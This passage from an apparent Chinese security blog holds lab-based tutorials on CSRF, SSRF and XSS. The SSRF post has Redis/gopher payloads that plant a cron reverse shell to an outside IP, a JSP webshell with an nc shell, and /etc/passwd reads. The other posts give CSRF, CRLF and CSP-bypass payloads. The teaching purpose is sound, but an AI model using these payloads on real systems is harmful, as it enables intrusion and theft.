要求更加严格一点，但仍并不复杂。任何个人网站、博客，被黑客上传页面的网站都有可能是发起攻击的来源，后端接口不能将安全寄托在仅允许 POST 上面。\n这里可以通过 Burpsuite 自带的 CSRF Poc 工具进行攻击，不过在使用的时候也有一些小技巧。\n基础的 CSRF 攻击体验对应可以尝试的靶场，在这靶场当中，并没有添加任意的 CSRF 防御\n\n靶场地址 Lab: CSRF vulnerability with no defenses\n\n因为 CSRF 本质上是一种钓鱼，所以我们也需要第三方网站攻击，如自己的服务器，或者 Burpsuite 靶场自带的 Exploit server；WebGoat 的 WebWolf。\n我们先登录进靶场当中，发现有一功能点 ———— Update email\n\n\n\n试想一下，我们账号进行了 Update email 的操作。\n若我们在自己的服务器上面挂上恶意的 Payload，诱导他人点击之后。相对应的，对方的邮箱也会变成我们 CSRF Poc 所指定的，这样子一来，我就可以通过 “忘记密码” 这种服务来获取他账户的权限了。(当然这里有个前提，对方是登录过的且 Cookie 处于生效期间)\n\nExploit 部分\n用 Burpsuite 自带的 CSRF Poc 构造出基本框架；\n\n\n然后我们把这个核心的表单拿出来，并加以修改，构造成最后的 POC\n&lt;form method=\"$method\" action=\"$url\"> \n\t\n\t&lt;input type=\"hidden\" name=\"$param1name\" value=\"$param1value\"> \n&lt;/form> \n&lt;script>\n\tdocument.forms[0].submit(); \n&lt;/script>\n\n再放入到 Exploit Server 当中，点击 Deliver it to victim 即可。\n在对方未对 CSRF 进行任何防御的时候，上述两种 CSRF 攻击方式能够通杀。\n\n懂其攻 -&gt; 知其守\n我们现在已经知道 CSRF 攻击方式了，接下来着重讲一讲 CSRF 的防御手段以及绕过方式。\n\n0x05 CSRF 的防御手段\n主流的 CSRF 防御手段有以下两种\n\nban 掉不明域外访问 ———— 使用同源检测与 Samesite Cookie\n多加一层验证手段 CSRF Token\n\n\n\n1. 接近无敌的防御手法 CSRF Token如果通俗易懂地解释一下 CSRF Token 的工作原理的话是这样的。\nCSRF Token 每随着页面被操作，Token 都会改变，比如 f5 刷新，点击按钮等等，都会导致 CSRF Token 变化。\n而每一个请求的 CSRF Token 会通过后端代码验证 Token 的有效性 ———— 是否正确，在时间戳上是否有效，如果加密字符串一致且时间未过期，那么这个Token就是有效的。\n以 Java 为例，我们介绍一下 CSRF Token 服务端的校验逻辑\nHttpServletRequest req = (HttpServletRequest)request; HttpSession s = req.getSession(); \n// 从 session 中得到 csrftoken 属性 \nString sToken = (String)s.getAttribute(“csrftoken”); if(sToken == null) &#123; \n\t// 产生新的 token 放入 session 中 \n\tsToken = generateToken(); s.setAttribute(“csrftoken”,sToken); chain.doFilter(request, response); \n&#125;\nelse &#123; \n\t// 从 HTTP 头中取得 csrftoken \n\tString xhrToken = req.getHeader(“csrftoken”); \n\t// 从请求参数中取得 csrftoken \n\tString pToken = req.getParameter(“csrftoken”); \n\tif(sToken != null &amp;&amp; xhrToken != null &amp;&amp; sToken.equals(xhrToken))&#123; \n\t\tchain.doFilter(request, response); \n\t&#125;\n\telse if(sToken != null &amp;&amp; pToken != null &amp;&amp; sToken.equals(pToken))&#123; \n\t\tchain.doFilter(request, response); \n\t&#125;\n\telse\n\t&#123; request.getRequestDispatcher(“error.jsp”).forward(request,response); \n\t&#125; \n&#125;\n\n2. 用的较少的限制同源Samesite 是 Set-Cookie 的一种属性，它有三个值\nStrict最为严格，完全禁止第三方 Cookie，跨站点时，任何情况下都不会发送 Cookie。换言之，只有当前网页的 URL 与请求目标一致，才会带上 Cookie。\nSet-Cookie: CookieName=CookieValue; SameSite=Strict;\n\nLax规则稍稍放宽，大多数情况也是不发送第三方 Cookie，但是导航到目标网址的 Get 请求除外。\nSet-Cookie: CookieName=CookieValue; SameSite=Lax;\n\n还有一种属性为 None，这种属性代表关闭了 SameSite\n\n一般攻击要进行绕过可以尝试将 SameSite 设置为 None\n\n\n这种方法的原理也比较简单，因为 CSRF 的本质也是钓鱼，比如我通过邮箱发送钓鱼邮件，那么这时候的 “源” 就是邮箱界面。\n如果服务器设置了严格的同源政策，将不接收来自邮箱这一 “源” 的请求。\n\nok，讲完了常规的防御手段，接下来我们聊聊绕过\n\n0x06 针对 CSRF Token 与同源政策的绕过手段\n我们的绕过手段是基于 CSRF Token 或同源政策并不是那么严格的情况下，甚至某些时候由于设计的疏忽产生的逻辑漏洞。\n\n若非特别提醒，以下所有靶场的业务点均处于 “Update email” 下。\n1. 将 POST 修改为 GET 请求进行绕过\n靶场地址 Lab: CSRF where token validation depends on request method)\n\n\n背后逻辑：\n\nCSRF Token 在 POST 请求当中生效，且业务点并非完全限制请求为 POST 请求，从而给了攻击者进行绕过的机会。\n探测方法：将 CSRF Token 删掉，并将 HTTP 请求修改为 GET 请求。\n\n\n此时的回显为 &quot;Missing parameter &#39;csrf&#39;&quot;，我们再将 HTTP 请求修改为 GET 请求，观察回显。\n\n\n回显 302，代表我们可以用这种方式进行绕过，构造 Payload\n\n\n2. 删除 CSRF Token 进行绕过\n靶场地址 Lab: CSRF where token validation depends on token being present\n\n\n背后逻辑:\n\n并没有强验证 CSRF Token 的存在性。\n我们尝试删除 CSRF Token，回显 302\n\n\n在删除掉 CSRF Token 之后生成 POC 即可。\n3. CSRF Token 未与用户 Session 绑定\n靶场地址 Lab: CSRF where token is not tied to user session\n\n\n背后逻辑\n\n未进行严格的一一身份对应，这其实很好理解。举个例子，我们登录注册界面，实际上是需要去匹配用户名与密码是否相等的，而这里的逻辑也是一致。\n那么这里，我可以先修改 Cookie，再修改 CSRF Token，来观察 CSRF Token 与 Cookie 是否对应了，或者说是否绑定了。\n修改 Cookie 中的 Session 值，观察回显为 “Unauthorized”\n\n\n修改 CSRF Token，观察回显为 “Invalid CSRF Token”\n说明 CSRF Token 并未与 session 绑定，而是与 csrfKey(也就是 value) 绑定的，根据 cookie 的传递性，我们可以在其他页面提前把 csrfKey 注入进去，这里我们利用 img 与 onerror 组合的 XSS 以及 CLRF 技术来构造 CSRF。\n\n这里借用梨子师傅的 Poc\n\n\n\n当受害者点击 CSRF 链接时会先触发 CLRF 注入 Set-Cookie 参数值，将 csrfKey 值添加到 Cookie 中，然后再用附有与 csrfKey 对应的 CSRF Token 的请求去提交修改邮箱请求。\n4. 当 Cookie 中的 CSRF 值与 CSRF Token 的值一致时\n靶场地址 Lab: CSRF where token is duplicated in cookie\n\n\n背后逻辑：\n\n只是将 CSRF Token 简单复制到 cookie 头中，然后仅验证两者是否一致。\n所以这里我们的绕过 Poc 的核心部分应该是这样的,%0d%0a 为\\r\\n，也就是 CR 与 LF\n&lt;img src&#x3D;&quot;url&#x2F;?search&#x3D;test%0d%0aSet-Cookie:%20csrf&#x3D;jVDOkLRjgEe41xJlURwUeAIcDet4Cier&quot; onerror&#x3D;&quot;document.forms[0].submit();&quot;&#x2F;&gt;\n\n\n\n5. 对不严格的 Referer 限制进行绕过\n靶场地址 Lab: CSRF with broken Referer validation \n\n\n背后逻辑\n\n并没有特别严格地限制 Referer，仅仅只是不允许了这一种的 Referer。\nReferer: 靶场地址.com\n\n// 下面是非法的\n\nReferer: baidu.com\n\n一般我们通过 Referer: baidu.com 来判断 Referer 的限制。\n若 Referer: baidu.com 被限制，则我们可以通过这种方式进行绕过\nhttp:&#x2F;&#x2F;attacker-website.com&#x2F;csrf-attack?baidu.com\n\n\n靶场部分，同样是对更改邮箱这个功能点进行 CSRF 攻击\n\n这里我们需要介绍一下 history.pushState，这个函数顾名思义，就是插入历史记录的，所以这也就是为什么第三个参数的值修改为与攻击链接同源后即可绕过错误地 Referer 头验证机制，所以我们这样构造 CSRF 页面。\n我们先修改 Referer 为 baidu.com 查看回显，成功发包。\n\n\n修改 Referer 为 baidu.com+?laburl，回显为 302 成功。\n\n\n构造 Payload，将 history.pushState 的第三个参数修改为 Lab 的 URL 地址。投放之后，在 Head 当中添加 Referrer-Policy: unsafe-url\n\n\n0x07 小结CSRF 攻击本质上还是一种钓鱼手段，本文着重讲了一些 CSRF 攻击的绕过手法，说不定渗透的时候多试一试就能起到意想不到的效果。\n","categories":["从0到1"],"tags":["从0到1"]},{"title":"从0到1完全掌握SSRF","url":"/2022/05/16/%E4%BB%8E0%E5%88%B01%E5%AE%8C%E5%85%A8%E6%8E%8C%E6%8F%A1SSRF/","content":"\n本文首发于 FreeBuf https://www.freebuf.com/articles/web/333318.html\n\n\n\n从0到1完全掌握 SSRF\n二刷漏洞：知其所以然 &lt;-&gt; 知其然 -&gt; 懂其攻 -&gt; 知其守\n\n\n主要结合 SSRF-Lab 进行 SSRF 的学习。\n\n0x01 前言刚二刷完 CSRF，继续 SSRF\nSSRF 主要是由于一些危险函数与危险协议产生的。我们以 PHP 为例，列举一下这些危险函数。\nfile_get_contents()\nfsockopen()\ncurl_exec()\nSoapClient\n\n\n一些危险协议\n\nfile://\ngopher\ndict\n\netc...\n\n\n0x02 知其然：什么是 SSRF?\n先挂一张生动的图\n\n\n\n攻击者从外网通过 SSRF 攻击访问到内网，接着对内网的应用展开攻击，这些应用包括但不限于 MySQL，redis，SMTP 等等 ……\nSSRF (全称：Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF 攻击的目标是从外网无法访问的内部系统。\n\n正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统。\n\n0x03 SSRF 的原理\n从一般的面试角度出发的话，有几个针对 SSRF 常见的面试问题。\n\nSSRF 中可以利用的协议有哪一些？\nSSRF 中能利用的函数一般有哪些？\n讲一讲 CTF 中有没有遇到过 SSRF，当时是怎么解决的。\nSSRF 的原理\n\n\n\n如果不在知道原理的基础上回答这些问题，很多都只是有一知半解的感觉，所以我们先把原理讲清楚了再进行下一步。\nSSRF 形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。比如从指定 URL 地址获取网页文本内容，加载指定地址的图片，下载等等。\n0x04 SSRF 的利用方式\n主要分为两个方向，SSRF 利用相关的危险函数；SSRF 可利用的协议操作\n\nSSRF 利用相关的危险函数以 PHP 为例，说明一些可利用的危险函数\n1. file_get_contents() 与 readfile()file_get_contents 这一函数是把 传入的参数(变量) 写入字符串，当把 传参 是内网文件的时候，会先去吧这个文件的内容读出来再写入，导致了任意文件读取，也就是信息泄露的一种。一般这种攻击也与目录遍历相结合。\n// ssrf.php\n&lt;?php\n$url = $_GET['url'];;\necho file_get_contents($url);\n?>\n\n\n2. fsockopen()fsockopen($hostname,$port,$errno,$errstr,$timeout) 用于打开一个网络连接或者一个 Unix 套接字连接，初始化一个套接字连接到指定主机（hostname），实现对用户指定 url 数据的获取。该函数会使用 socket 跟服务器建立 tcp 连接，进行传输原始数据。 fsockopen() 将返回一个文件句柄，之后可以被其他文件类函数调用（例如：fgets()，fgetss()，fwrite()，fclose()还有feof()） 如果调用失败，将返回false。\n测试代码：\n&#x2F;&#x2F; ssrf.php\n&lt;?php\n$host&#x3D;$_GET[&#39;url&#39;];\n$fp &#x3D; fsockopen($host, 80, $errno, $errstr, 30);\nif (!$fp) &#123;\n    echo &quot;$errstr ($errno)&lt;br &#x2F;&gt;\\n&quot;;\n&#125; else &#123;\n    $out &#x3D; &quot;GET &#x2F; HTTP&#x2F;1.1\\r\\n&quot;;\n    $out .&#x3D; &quot;Host: $host\\r\\n&quot;;\n    $out .&#x3D; &quot;Connection: Close\\r\\n\\r\\n&quot;;\n    fwrite($fp, $out);\n    while (!feof($fp)) &#123;\n        echo fgets($fp, 128);\n    &#125;\n    fclose($fp);\n&#125;\n?&gt;\n构造 ssrf.php?url=www.baidu.com 即可成功触发 ssrf 并返回百度主页，这种更像是一种重定向 (302) 之类的，没什么用。\n\n\n3. curl_exec()curl_init(url) 函数初始化一个新的会话，返回一个 cURL 句柄，供 curl_setopt()，curl_exec()和curl_close() 函数使用。\n测试代码：\n&#x2F;&#x2F; ssrf.php\n&lt;?php \nif (isset($_GET[&#39;url&#39;]))&#123;\n\t$link &#x3D; $_GET[&#39;url&#39;];\n\t$curlobj &#x3D; curl_init(); &#x2F;&#x2F; 创建新的 cURL 资源\n\tcurl_setopt($curlobj, CURLOPT_POST, 0);\n\tcurl_setopt($curlobj,CURLOPT_URL,$link);\n\tcurl_setopt($curlobj, CURLOPT_RETURNTRANSFER, 1); &#x2F;&#x2F; 设置 URL 和相应的选项\n\t$result&#x3D;curl_exec($curlobj); &#x2F;&#x2F; 抓取 URL 并把它传递给浏览器\n\tcurl_close($curlobj); &#x2F;&#x2F; 关闭 cURL 资源，并且释放系统资源\n \n\t&#x2F;&#x2F; $filename &#x3D; &#39;.&#x2F;curled&#x2F;&#39;.rand().&#39;.txt&#39;;\n\t&#x2F;&#x2F; file_put_contents($filename, $result); \n\techo $result;\n&#125;\n?&gt;\n构造 ssrf.php?url=www.baidu.com 即可成功触发 ssrf 并返回百度主页：\n\n\n\n但是攻击方式不止这么一点，其实是可以通过其他方式提高 curl_exec() 这里的攻击危害的。\n\n最常见的是通过 file、dict、gopher 这三个协议来进行渗透。\ncurl -vvv 'dict://127.0.0.1:6379/info' \ncurl -vvv 'file:///etc/passwd' \n# * 注意: 链接使用单引号，避免$变量问题 \ncurl -vvv 'gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a*/1 * * * * bash -i >&amp; /dev/tcp/103.21.140.84/6789 0>&amp;1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a'\n\nSSRF 的危险协议\n利用 SSRF-Lab 进行学习，一边代码审计一边学习漏洞利用。\n\n\n可利用的主要就几个协议吧 \nfile 协议结合目录遍历读取文件。\ngopher 协议打开端口。\ndict 协议主要用于结合 curl 攻击。\nhttp 协议进行内网探测。\n\n\n\nSSRF-Lab 搭建教程\n1. file 协议的利用Payload\nfile:///etc/password  # file:// 之后可以接任意文件\n这里的 Payload 只是一个基础示范，还可以读取很多文件，在实战渗透当中，更多情况应该是通过 GET 请求攻击的。\nhttp:&#x2F;&#x2F;ip&#x2F;index.php?url&#x3D;file:&#x2F;&#x2F;&#x2F;etc&#x2F;password\n\n而在 SSRF-Lab 当中较简单，在框中输入 file:///etc/password 即可。\n\n\n2. dict 协议的使用利用 dict 协议，dict://ip/info 可获取本地 redis 服务配置信息。\n如果在靶场当中要尝试 dict 协议读取 Redis 需要先安装一下 redis-server，具体可见 redis 与 dict 协议\n3. gopher 协议的使用首先先了解一下通常攻击 Redis 的命令，然后转化为 Gopher 可用的协议\nredis-cli -h $1 flushall\necho -e \"\\n\\n*/1 * * * * bash -i >&amp; /dev/tcp/127.0.0.1/45952 0>&amp;1\\n\\n\"|redis-cli -h $1 -x set 1\nredis-cli -h $1 config set dir /var/spool/cron/\nredis-cli -h $1 config set dbfilename root\nredis-cli -h $1 save\n//redis-cli查看所有的keys及清空所有的数据\n这便是常见的exp，只需自己更改IP和端口即可，改成适配于 Gopher 协议的 URL：\ngopher:&#x2F;&#x2F;127.0.0.1:6379&#x2F;_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a*&#x2F;1 * * * * bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;127.0.0.1&#x2F;45952 0&gt;&amp;1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0\n\n经过url解码便是：\ngopher://127.0.0.1:6379/_*1 $8 flushall *3 $3 set $1 1 $64 */1 * * * * bash -i >&amp; /dev/tcp/127.0.0.1/45952 0>&amp;1 *4 $6 config $3 set $3 dir $16 /var/www/html/ *4 $6 config $3 set $10 dbfilename $4 root *1 $4 save quit\n\n\n\n0x05 一些常见的绕过手法1. @绕过URL的完整格式是\n[协议类型]:&#x2F;&#x2F;[访问资源需要的凭证信息]@[服务器地址]:[端口号]&#x2F;[资源层级UNIX文件路径][文件名]?[查询]#[片段ID]\n\n所以你访问\n> &lt;a href=”http://baidu.com@1.1.1.1″”>http://baidu.com@1.1.1.1\n和\nhttp:&#x2F;&#x2F;1.1.1.1\n效果是一样的，因为解析的本来就是 @ 后面的服务器地址。\n2. 进制绕过\n这里可以参考 SSRF-Lab advance 的第一题的。\n\n源代码\nif (preg_match('#^https?://#i', $handler) !== 1) &#123;   \n echo \"Wrong scheme! You can only use http or https!\";   \n die();  \n&#125; else if (preg_match('#^https?://10.0.0.3#i', $handler) === 1) &#123;   \n echo \"Restricted area!\";   \n die();  \n&#125;\n\nphp 代码中通过正则对输入的 IP 进行了过滤。\n众所周知，IP 地址是由四个字节组成的，一旦包含了小数点，就必须考虑到大小端表示，因为这个会影响 IP 地址的解析。不过好在所有的网络地址都是大端表示法，只需要注意这一点即可，下面我们介绍 IP 地址的表达方式。\n字符串:       10.0.0.3  \n二进制:       00001010 . 00000000 . 00000000 . 00000011  \n十六进制:    0A.00.00.03  \n整数:           167772163\n\n这些表达方式都能被 curl 命令解析为正确的IP地址，之后如果我们要访问的IP地址被简单粗暴地过滤了就可以试试这种方法。除了上面的表达方式之外，还可以用 16 进制 0x0A000003 表示IP地址，还有一个很少人知道的绕过小姿势，就是用 8 进制代替 10 进制来表示 IP 地址。在计算机的世界里，一旦在 20 前面加个 0 就会变成8进制，比如 http://01200000003 实际上还是 http://10.0.0.3。上面两个表达方式，PHP 的 curl 模块能解析出来。\n十六进制：   http:&#x2F;&#x2F;0x0A.0x00.0x00.0x03  \n八进制：       http:&#x2F;&#x2F;012.00.00.03  \n八进制溢出：http:&#x2F;&#x2F;265.0.0.3\n\n3. 用句号替换 “.”4. xip.io 和 xip.name 绕过\n泛域名解析，无需配置，将自定义的任何域名解析到指定的 IP 地址。假设你的 IP 地址是 10.0.0.1，你只需使用 前缀域名+IP地址+xip.io 即可完成相应自定义域名解析。\n\n10.0.0.1.xip.io # 解析到 10.0.0.1 \nwww.10.0.0.2.xip.io # www 子域解析到 10.0.0.2 mysite.10.0.0.3.xip.io # mysite 子域解析到 10.0.0.3 foo.bar.10.0.0.4.xip.io # foo.bar 子域解析到 10.0.0.4\n\n\nxip.name 在使用上与 xip.io 一致\n\n10.0.0.1.xip.name # 解析到 10.0.0.1 \nwww.10.0.0.2.xip.name # www 子域解析到 10.0.0.2 mysite.10.0.0.3.xip.name # mysite 子域解析到 10.0.0.3 foo.bar.10.0.0.4.xip.name # foo.bar 子域解析到 10.0.0.4\n\n5. DNS 重绑这种绕过方式还是很有效的，HackTheBox 上有一道 CTF 题目就是 DNS 重绑的。\nHackTheBox-baby-CachedView | 芜风 \n密码可以私聊我\nDNS 重绑的话，原理如图所示\n\n\n工具网站如下https://lock.cmpxchg8b.com/rebinder.html\n简单叙述一下逻辑：\n1.判定你给的 IP 或者域名解析后的 IP 是否在黑名单中2.若在，退出报错3.若不在，再次访问你给的 IP 或者域名解析后的 IP；执行后续业务模块\n所以思路很简单：你只需要有个域名，但是它映射两个 IP；同时设置 TTL 为 0，能方便两个 IP 即刻切换。\n效果类比：你访问 wwfcww.xyz 这个域名，第一次解析的 IP 是 192.168.0.1；而第二次解析的IP是 127.0.0.1，如此一来即可进行 SSRF 攻击。\n0x06 SSRF in JavaJava 中 SSRF 的存在性\n这里和 PHP 相差还是有多大的，首先是协议问题，由于 Java 没有 php 的 cURL，所以 Java SSRF 支持的协议，不能像 php 使用 curl -V 查看。\n\n然后 Java 里面的 SSRF，本质上其实和 PHP 一样，就是建立 URL 连接的原理\n从import sun.net.www.protocol可以看到，支持以下协议\nfile ftp mailto http https jar netdoc\n\n\n然后也看到了一些师傅的总结吧，感觉有些地方不是特别准确，具体的其实代码审计一看就清晰了。\n\n一般是需要有 URL 这种，然后建立 URLConnection，代码可以是如下 ———— 参考 CTFShow 844\npublic String goPage(@RequestParam Map&lt;String, String> param) &#123;  \n    String result = \"\";  \n String request = \"\";  \n String url = (String)param.get(\"url\");  \n String port = (String)param.get(\"port\");  \n if (null != url &amp;&amp; null != param &amp;&amp; !param.isEmpty()) &#123;  \n        try &#123;  \n            Socket socket = new Socket(url, Integer.valueOf(port));  \n OutputStream out = socket.getOutputStream();\n\t\t\t\n\t\t\t\n………… 后续内容省略\n\t\n\n\n这里就建立了 Socket 请求，也就是网络请求，所以存在 SSRF。\n攻击Java SSRF 的攻击手段和 PHP 的类似，都是写入 shell，或者直接打 Redis 未授权，但是 PHP 的那个脚本，在 Java 里面用不了，所以这一块稍微总结一下写入 shell 的攻击手段。\n还是以 CTFShow 844 为例，要发包的接口是 &#x2F;goPage；两个参数 url 和 port。尝试访问 6379 端口，发现可行。尝试写 shell\n\n\n这里的 payload\nconfig&#x3D; set dir &#x2F;usr&#x2F;local&#x2F;tomcat&#x2F;webapps&#x2F;ROOT&#x2F;&amp;config set dbfilename 1.jsp&amp;set xx &#39;&lt;%Runtime.getRuntime().exec(new String[]&#123;&quot;sh&quot;,&quot;-c&quot;,request.getParameter(&quot;i&quot;)&#125;);%&gt;&#39;&amp;save&#x3D;&amp;quit&#x3D;&amp;url&#x3D;127.0.0.1&amp;port&#x3D;6379\n\n进行一下 url 编码之后打\ngoPage?config&#x3D;%20set%20dir%20&#x2F;usr&#x2F;local&#x2F;tomcat&#x2F;webapps&#x2F;ROOT&#x2F;&amp;config%20set%20dbfilename%201.jsp&amp;set%20xx%20&#39;%3C%25Runtime.getRuntime().exec(new%20String%5B%5D%7B%22sh%22%2C%22-c%22%2Crequest.getParameter(%22i%22)%7D)%3B%25%3E&#39;&amp;save&#x3D;&amp;quit&#x3D;&amp;url&#x3D;127.0.0.1&amp;port&#x3D;6379\n\n\n\n然后完成弹 shell\n1.jsp?i=nc xxx.xx.xx.xx 3333 -e /bin/sh\n\n0x07 小结SSRF 整体上来说入门并不难，难的是在实战渗透当中想到这么做。利用 SSRF-Lab 可以省去自己搭环境的时间。\n\n对于 CTF 选手来说，SSRF 的绕过手段，尤其是 DNS 重绑这个绕过方式挺厉害的，建议学习。\n\n0x08 参考资料https://www.anquanke.com/post/id/262430https://se8s0n.github.io/2019/05/19/SSRF-LABS%E6%8C%87%E5%8D%97/https://xz.aliyun.com/t/7333https://www.freebuf.com/articles/web/260806.html\n","categories":["从0到1"],"tags":["从0到1"]},{"title":"从0到1完全掌握XSS","url":"/2022/05/05/%E4%BB%8E0%E5%88%B01%E5%AE%8C%E5%85%A8%E6%8E%8C%E6%8F%A1XSS/","content":"从0到1完全掌握 XSS\n\nXSS Payload 大全\n从0到1完全掌握 XSS\n文章篇幅较长，建议分块观看学习。\n\n0x01 前言本人二刷 XSS，在一刷的时候是以漏洞挖掘与漏洞利用为主，实际上完全对于实战根本没有概念，出去工作一段时间之后才算是拿出来应用。写这篇文章是打算再好好地梳理一遍 XSS。\n\nXSS 的本质是一种高级钓鱼手法。\n\n0x02 什么是 XSSXSS (Cross Site Scripting) 攻击全称跨站脚本攻击，是为不和层叠样式表 (Cascading Style Sheets, CSS) 的缩写混淆，故将跨站脚本攻击缩写为 XSS。XSS 是一种经常出现在 Web 应用中的计算机安全漏洞，它允许恶意 Web 用户将代码植入到提供给其它用户使用的页面中。\n\nXSS 的运行原理是将恶意的 script 脚本插入进 html&#x2F;css&#x2F;js 文件当中。代码长这样。\n\n\n\n0x03 XSS 的危害前文我们说 XSS 本质上来说是一种钓鱼攻击，所以 XSS 的危害角度上也是以钓鱼能够造成的危害为主。\n0x04 XSS 简单应用场景举例这里我想先介绍 XSS 的应用方法，如此一来讲起来不会太空洞，也能与下面的攻击手段有所呼应。以反射型 XSS 为例，原理图如下。\n\n\n\n这里借用国光师傅的图片进行分析\n\n\n\n这是一个恶意的 QQ 空间钓鱼网站，我们在输入框内输入 username%20&lt;script&gt;alert(document.cookie)&lt;/script&gt;，再对登陆的按钮设置一个 href 到真正的 QQ 空间官网。然而当时用户输入的用户名密码已经被攻击者窃取了。\n0x05 XSS 基本攻击手段\nXSS 根据效果不同主要分为三种类型\n反射型 XSS，存储型 XSS，DOM 型 XSS\n\n危害性来说，存储型 XSS &gt;&gt; 反射型 XSS ~&#x3D; DOM 型 XSS我们接下来细讲一下这三种 XSS 的攻击手段。\n1. 反射型 XSS 及绕过手段(1) 什么是反射型 XSS反射型 XSS，也叫非持久型 XSS，转瞬即逝。\n利用比较简单，比如在搜索框中，我记得当时 2020 年，b 站的搜索框还是存在 XSS 的，现在没有了。\n反射型 XSS 的 Payload 如下\n&lt;script>alert(1)&lt;script>\n\n\n\n效果如图所示\n\n\nXSS 的攻击构造与理解异常简单与轻松，难点在于各种绕过手段。\n一、当大多数标签被禁止时的绕过\nLab: Reflected XSS into HTML context with most tags and attributes blocked\n\n还是常规的 Fuzz 测试，在尝试 XSS 攻击之后，若失败了就进行 Fuzz 测试，因为无法排除是不是 WAF 过滤了部分关键字。\n探测出来 onresize 标签还是有效的，我们可以通过这一串 Payload 唤起打印服务\n&lt;body onresize=print()>\" onload=this.style.width='100px'>\n\n\n\n二、当事件处理器与 href 被禁用时的绕过\n老样子还是需要 Fuzz 的。如果渗透测试真正遇到这种情况的话，svg 标签的绕过方式还是主流。\n\n\nLab: Reflected XSS with event handlers and href attributes blocked\n\nPayload\n&lt;svg>\n\t&lt;a>\n\t&lt;animate attributeName=href\n     values=javascript:alert(1) />\n\t\t&lt;text x=20 y=20>Click me&lt;/text>\n    &lt;/a>\n\n还有一些 svg 标签的绕过手段\n&lt;svg>&lt;animatetransform onbegin=alert(1)>\n\n三、对 script 进行闭合后构造 Payload对某些语句中的符号进行闭合。有些 Web 后端代码会通过反斜杠转义，对很多单引号字符进行过滤，那么转义之后的代码就不能进行原 Payload 的作用。\n\nXSS Insert Into-&gt; JavaScript\n\n这种 Payload 可以是通过修改 Web 网站内部 JavaScript 来实现的，因为 JavaScript 本身就可以直接执行 alert 方法，无需使用 &lt;script&gt; 标签。\n一般的 Payload\n'-alert(document.domain)-' \n';alert(document.domain)//\n\n四、绕过 CSP 攻击\nCSP：content security policy，比较严格的防御 XSS 手段。\n\n它一般在 HTTP 包里面长这样\n\n\nCSP通过这样的指令限制只能加载与页面本身相同来源的资源  \nscript-src 'self'\n```  \n通过下面的指令限制只能从指定域中加载资源  \n```http\nscript-src https://scripts.normal-website.com\n\n但是这种允许外部域的做法还是有风险的，如果攻击者可以向其传递恶意脚本也会遭到攻击的。而且应该也同时不信任来自 CDN 的资源，因为也有被投放的风险。CSP 还通过随机数和哈希值来指定可信资源。\n\nCSP 的指令指定一个随机数，加载脚本的标签也必须有相同的随机数。否则就不执行该脚本。并秉持一次性的原则，避免被猜解。\nCSP 指令可以指定脚本内容的哈希值。不匹配也是不会执行的。\n\n绕过方式一 悬空标记攻击\n这种和闭合语句的攻击差不多。\n\n虽然 CSP 通常可以阻止脚本，但是经常不会禁止加载图片资源，这就导致可以利用 img 标签窃取 CSRF 令牌。\n有些浏览器比如 chrome，就有内置的悬空标记缓解功能，这个功能可以阻止包含某些字符的请求，比如换行符、未编码的新一行符或者尖括号。还有一些策略更为严格，可以防止所有形式的外部请求。\n但是还是可以通过注入一个 HTML 元素，点击该元素就会将该元素包含的所有内容发送到外部服务器的方式绕过这种策略，这里感觉有点像点击劫持攻击。\n\nLab: Reflected XSS protected by very strict CSP, with dangling markup attack\n\n首先我们观察一下修改邮箱的表单要提交哪些信息\n\n\n接着利用悬挂标记攻击将 CSRF Token 窃取出来，所以我们这样构造 Payload \n\n\n再然后用 CSRF 盗用 token，再发包即可。\n绕过方式二  对 CSP 限制不严格的情况下攻击\nCSP 是有设置的，若 base-url 为空的话，可以通过 token 值来添加新的 CSP 指令。\n\nPayload\n&lt;script>alert(1)&lt;/script>&amp;token=;script-src-elem 'unsafe-inline'\n\n我们使用 script-src-elem 对 CSP 进行覆盖，从而进行 XSS 攻击。\n2. 存储型 XSS存储型 XSS 是危害性最大的 XSS 了，它一般出现于评论留言功能处，大致的利用方法与绕过手段与反射型 XSS 很像，原理图如下。\n\n\n\n如果执行起来也是插入进上下文标签当中，和之前反射型 XSS 的代码图类似，都是没有加任何的过滤手段，如图。\n\n\n\n我们在新增的评论中将 username 构造成 Payload\nusername=&lt;script>alert(1)&lt;/script>\n\n而这一条评论，又会被保存到数组或者是数据库当中(这个看 Web 程序的设计)，就造成了存储型 XSS。\n\n绕过手段不再逼逼，和反射型 XSS 是异曲同工。\n\n3. DOM 型 XSS(重点!)DOM 型的 XSS 是基于文档对象模型 Document Objeet Model，DOM)的一种漏洞。说白了就是那些标签，比如 img，input 等这种类型的 DOM 节点标签而已，而 DOM 型 XSS 打的就是这些。\n\n我个人觉得 DOM 型 XSS 与反射型，存储型 XSS 的区别可谓不是一点半点，虽然有人把 DOM 型 XSS 归结到反射型 XSS 当中，但是我们看下去，会感受到些许不同。\n\nDOM 型 XSS 全部都是由前端进行触发的。所以我们平常如果挖洞，还是很考验代码审计的耐心的。\n\n我们下面讲几种常见的攻击方式，在这之前，我们先把可以利用的 DOM 节点，以及其 Payload 拉出来。Payload 摘自HACK 师傅的文章\n\n一些常用的标签与属性下面我列举的标签大部分是可以自动触发 js 代码的，无需用户去交互，大部分情况下我们也是希望是自动触发而不是等用户去触发。\nscirpt 标签&lt;script&gt; 标签用于定义客户端脚本，比如 JavaScript。\n&lt;script>alert(1);&lt;/script>&lt;script>alert(\"xss\");&lt;/script>\n\nimg 